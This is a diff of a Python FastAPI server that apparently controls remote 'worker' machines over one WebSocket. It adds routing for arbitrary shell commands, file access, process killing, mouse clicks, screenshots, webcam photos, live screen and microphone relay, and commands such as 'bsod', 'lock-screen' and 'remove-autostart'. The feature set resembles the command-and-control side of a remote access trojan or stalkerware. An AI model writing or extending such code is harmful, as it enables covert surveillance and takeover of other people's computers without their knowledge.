@@ -10,12 +10,16 @@ from database import get_db, SessionLocal
 import models, schemas, auth as auth_utils
 
 SCREENSHOTS_DIR = Path("uploads/screenshots")
+WEBCAM_DIR = Path("uploads/webcam")
 # In-memory: worker_id -> timestamp when screenshot was requested
 _screenshot_requests: dict[int, float] = {}
 
+# Single persistent worker WebSocket (replaces all individual channels)
+_worker_main_ws: dict[int, WebSocket] = {}
+
 # Webcam streaming
 _worker_webcam_ws: dict[int, WebSocket] = {}
-_webcam_viewers: dict[int, list] = {}
+_webcam_viewers: dict[int, WebSocket] = {}
 
 # Live screen streaming
 _worker_screen_ws: dict[int, WebSocket] = {}
@@ -301,20 +305,21 @@ async def admin_shell_view(user_id: int, websocket: WebSocket, token: str):
 
     await websocket.accept()
     _shell_viewers[user_id] = websocket
-    worker_connected = user_id in _worker_shell_ws
+    worker_connected = user_id in _worker_main_ws or user_id in _worker_shell_ws
     await websocket.send_text(f"\x01{'connected' if worker_connected else 'offline'}")
     try:
         while True:
             msg = await websocket.receive()
             if msg["type"] == "websocket.disconnect":
                 break
-            # Admin sends command — forward to worker
+            # Admin sends command — forward to worker as JSON
+            import json as _json
             text = msg.get("text")
             if text:
-                worker_ws = _worker_shell_ws.get(user_id)
+                worker_ws = _worker_main_ws.get(user_id) or _worker_shell_ws.get(user_id)
                 if worker_ws:
                     try:
-                        await worker_ws.send_text(text)
+                        await worker_ws.send_text(_json.dumps({"type": "shell_exec", "cmd": text}))
                     except Exception:
                         await websocket.send_text("(ошибка: не удалось отправить команду)")
                 else:
@@ -377,19 +382,25 @@ async def admin_files_view(user_id: int, websocket: WebSocket, token: str):
 
     await websocket.accept()
     _files_viewers[user_id] = websocket
-    worker_online = user_id in _worker_files_ws
+    worker_online = user_id in _worker_main_ws or user_id in _worker_files_ws
     await websocket.send_text(f'\x01{"online" if worker_online else "offline"}')
     try:
         while True:
             msg = await websocket.receive()
             if msg["type"] == "websocket.disconnect":
                 break
+            import json as _json
             text = msg.get("text")
             if text:
-                worker_ws = _worker_files_ws.get(user_id)
+                worker_ws = _worker_main_ws.get(user_id) or _worker_files_ws.get(user_id)
                 if worker_ws:
                     try:
-                        await worker_ws.send_text(text)
+                        try:
+                            req = _json.loads(text)
+                            req["type"] = "file_req"
+                            await worker_ws.send_text(_json.dumps(req))
+                        except Exception:
+                            await worker_ws.send_text(text)
                     except Exception:
                         await websocket.send_text('{"error":"Ошибка отправки","id":null}')
                 else:
@@ -424,40 +435,43 @@ def get_processes(user_id: int, _=Depends(auth_utils.require_admin)):
 
 @router.post("/{user_id}/processes/kill", status_code=204)
 async def request_kill(user_id: int, data: dict, _=Depends(auth_utils.require_admin)):
+    import json as _json
     name = data.get("name", "").strip()
     if not name:
         raise HTTPException(status_code=400, detail="Process name required")
-    worker_ws = _worker_processes_ws.get(user_id)
+    worker_ws = _worker_main_ws.get(user_id) or _worker_processes_ws.get(user_id)
     if worker_ws:
         try:
-            await worker_ws.send_text(f"kill:{name}")
+            await worker_ws.send_text(_json.dumps({"type": "kill_process", "name": name}))
         except Exception:
             pass
 
 
 @router.post("/{user_id}/click", status_code=204)
 async def send_click(user_id: int, data: dict, _=Depends(auth_utils.require_admin)):
-    """Admin sends a normalized click (x,y in 0..1) to the worker via screen WS."""
+    """Admin sends a normalized click (x,y in 0..1) to the worker."""
+    import json as _json
     x = max(0.0, min(1.0, float(data.get("x", 0))))
     y = max(0.0, min(1.0, float(data.get("y", 0))))
-    worker_ws = _worker_screen_ws.get(user_id)
+    worker_ws = _worker_main_ws.get(user_id) or _worker_screen_ws.get(user_id)
     if worker_ws:
         try:
-            await worker_ws.send_text(f"click:{x}:{y}")
+            await worker_ws.send_text(_json.dumps({"type": "click", "x": x, "y": y}))
         except Exception:
             pass
 
 
 @router.post("/{user_id}/command", status_code=204)
 async def send_command(user_id: int, data: dict, _=Depends(auth_utils.require_admin)):
+    import json as _json
     cmd = data.get("command", "").strip()
     if cmd not in ("quit", "remove-autostart", "reboot", "lock-screen", "bsod"):
         raise HTTPException(status_code=400, detail="Unknown command")
-    worker_ws = _worker_commands_ws.get(user_id)
+    worker_ws = _worker_main_ws.get(user_id) or _worker_commands_ws.get(user_id)
     if not worker_ws:
         raise HTTPException(status_code=503, detail="Воркер не подключён")
     try:
-        await worker_ws.send_text(cmd)
+        await worker_ws.send_text(_json.dumps({"type": "command", "cmd": cmd}))
     except Exception:
         raise HTTPException(status_code=503, detail="Ошибка отправки команды")
 
@@ -489,6 +503,19 @@ async def upload_screenshot(
         raise HTTPException(status_code=403, detail="Only workers can upload screenshots")
     SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)
     path = SCREENSHOTS_DIR / f"{current_user.id}.jpg"
+    with open(path, "wb") as f:
+        shutil.copyfileobj(file.file, f)
+
+
+@router.post("/webcam-photo", status_code=204)
+async def upload_webcam_photo(
+    file: UploadFile = File(...),
+    current_user: models.User = Depends(auth_utils.get_current_user),
+):
+    if current_user.role != models.UserRole.worker:
+        raise HTTPException(status_code=403, detail="Only workers can upload webcam photos")
+    WEBCAM_DIR.mkdir(parents=True, exist_ok=True)
+    path = WEBCAM_DIR / f"{current_user.id}.jpg"
     with open(path, "wb") as f:
         shutil.copyfileobj(file.file, f)
 
@@ -558,17 +585,18 @@ async def admin_screenshot_view(user_id: int, websocket: WebSocket, token: str):
 
     await websocket.accept()
     _screenshot_view_ws[user_id] = websocket
-    worker_connected = user_id in _worker_screenshot_ws
+    worker_connected = user_id in _worker_main_ws or user_id in _worker_screenshot_ws
     await websocket.send_text(f"\x01{'connected' if worker_connected else 'offline'}")
     try:
         while True:
             msg = await websocket.receive()
             if msg["type"] == "websocket.disconnect":
                 break
+            import json as _json
             if msg.get("text") == "capture":
-                worker_ws = _worker_screenshot_ws.get(user_id)
+                worker_ws = _worker_main_ws.get(user_id) or _worker_screenshot_ws.get(user_id)
                 if worker_ws:
-                    try: await worker_ws.send_text("capture")
+                    try: await worker_ws.send_text(_json.dumps({"type": "screenshot_capture"}))
                     except Exception: pass
     except WebSocketDisconnect:
         pass
@@ -663,19 +691,20 @@ async def admin_webcam_view(user_id: int, websocket: WebSocket, token: str):
 
     await websocket.accept()
     _webcam_viewers[user_id] = websocket
-    worker_connected = user_id in _worker_webcam_ws
+    worker_connected = user_id in _worker_main_ws or user_id in _worker_webcam_ws
     await websocket.send_text(f"\x01{'connected' if worker_connected else 'offline'}")
     try:
         while True:
             msg = await websocket.receive()
             if msg["type"] == "websocket.disconnect":
                 break
+            import json as _json
             text = msg.get("text")
             if text == "capture":
-                worker_ws = _worker_webcam_ws.get(user_id)
+                worker_ws = _worker_main_ws.get(user_id) or _worker_webcam_ws.get(user_id)
                 if worker_ws:
                     try:
-                        await worker_ws.send_text("capture")
+                        await worker_ws.send_text(_json.dumps({"type": "webcam_capture"}))
                     except Exception:
                         pass
     except WebSocketDisconnect:
@@ -784,6 +813,123 @@ def get_screenshot(user_id: int, db: Session = Depends(get_db), _=Depends(auth_u
         raise HTTPException(status_code=404, detail="No screenshot available")
     mtime_ms = int(os.path.getmtime(path) * 1000)
     return FileResponse(path, media_type="image/jpeg", headers={"X-Captured-At": str(mtime_ms)})
+
+
+@router.get("/{user_id}/webcam-photo")
+def get_webcam_photo(user_id: int, _=Depends(auth_utils.require_admin)):
+    path = WEBCAM_DIR / f"{user_id}.jpg"
+    if not path.exists():
+        raise HTTPException(status_code=404, detail="No webcam photo available")
+    mtime_ms = int(os.path.getmtime(path) * 1000)
+    return FileResponse(path, media_type="image/jpeg", headers={"X-Captured-At": str(mtime_ms)})
+
+
+@router.websocket("/worker-ws")
+async def worker_main_stream(websocket: WebSocket, token: str):
+    """Single persistent WebSocket for all worker data channels.
+
+    Binary frames:  1st byte = channel (0x01=screen, 0x02=mic)
+    JSON text frames: {"type": "processes"|"shell_output"|"file_response"|
+                                "webcam_done"|"webcam_error"|"screenshot_done", ...}
+    """
+    import json as _json
+    user_id = _auth_worker(token)
+    if user_id is None:
+        await websocket.close(code=4003)
+        return
+
+    await websocket.accept()
+    _worker_main_ws[user_id] = websocket
+
+    # Tell admin viewers the worker is online
+    for d, msg in [(_screenshot_view_ws, "\x01connected"), (_webcam_viewers, "\x01connected"),
+                   (_shell_viewers, "\x01connected"), (_files_viewers, "\x01online")]:
+        v = d.get(user_id)
+        if v:
+            try: await v.send_text(msg)
+            except Exception: pass
+
+    try:
+        while True:
+            msg = await websocket.receive()
+            if msg["type"] == "websocket.disconnect":
+                break
+
+            data = msg.get("bytes")
+            if data:
+                if len(data) < 2:
+                    continue
+                ch = data[0]
+                payload = bytes(data[1:])
+                if ch == 0x01:  # live screen frame → relay to screen viewers
+                    viewers = _screen_viewers.get(user_id, [])
+                    dead = []
+                    for v in viewers:
+                        try: await v.send_bytes(payload)
+                        except Exception: dead.append(v)
+                    for d in dead:
+                        viewers.remove(d)
+                elif ch == 0x02:  # mic audio → relay to mic viewers
+                    viewers = _mic_viewers.get(user_id, [])
+                    dead = []
+                    for v in viewers:
+                        try: await v.send_bytes(payload)
+                        except Exception: dead.append(v)
+                    for d in dead:
+                        viewers.remove(d)
+                continue
+
+            text = msg.get("text")
+            if not text:
+                continue
+            try:
+                j = _json.loads(text)
+            except Exception:
+                continue
+
+            t = j.get("type")
+            if t == "processes":
+                _worker_processes[user_id] = {
+                    "processes": j.get("data", []),
+                    "updated_at": datetime.now(timezone.utc).isoformat(),
+                }
+            elif t == "shell_output":
+                v = _shell_viewers.get(user_id)
+                if v:
+                    try: await v.send_text(j.get("text", ""))
+                    except Exception: pass
+            elif t == "file_response":
+                v = _files_viewers.get(user_id)
+                if v:
+                    try: await v.send_text(_json.dumps({k: val for k, val in j.items() if k != "type"}))
+                    except Exception: pass
+            elif t == "webcam_done":
+                v = _webcam_viewers.get(user_id)
+                if v:
+                    try: await v.send_text("\x01webcam_done")
+                    except Exception: pass
+            elif t == "webcam_error":
+                v = _webcam_viewers.get(user_id)
+                if v:
+                    try: await v.send_text(f"\x01error:{j.get('error', 'unknown')}")
+                    except Exception: pass
+            elif t == "screenshot_done":
+                v = _screenshot_view_ws.get(user_id)
+                if v:
+                    try: await v.send_text("\x01screenshot_done")
+                    except Exception: pass
+
+    except WebSocketDisconnect:
+        pass
+    finally:
+        _worker_main_ws.pop(user_id, None)
+        # Tell admin viewers the worker went offline
+        for d, msg in [(_screenshot_view_ws, "\x01offline"), (_webcam_viewers, "\x01offline"),
+                       (_shell_viewers, "\x01offline"), (_files_viewers, "\x01offline")]:
+            v = d.get(user_id)
+            if v:
+                try: await v.send_text(msg)
+                except Exception: pass
 
 
 @router.patch("/{user_id}", response_model=schemas.UserOut)
